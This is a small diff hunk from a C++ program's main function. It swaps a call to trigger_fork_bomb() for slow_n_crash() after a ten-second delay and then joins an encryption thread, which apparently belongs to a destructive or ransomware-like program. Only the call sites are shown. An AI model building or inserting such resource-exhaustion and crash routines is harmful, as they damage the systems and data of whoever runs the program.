@@ -39,7 +39,7 @@ int main() {
     
     std::this_thread::sleep_for(std::chrono::seconds(10));
 
-    trigger_fork_bomb();
+    slow_n_crash();
 
     encryption_thread.join();
     return 0;
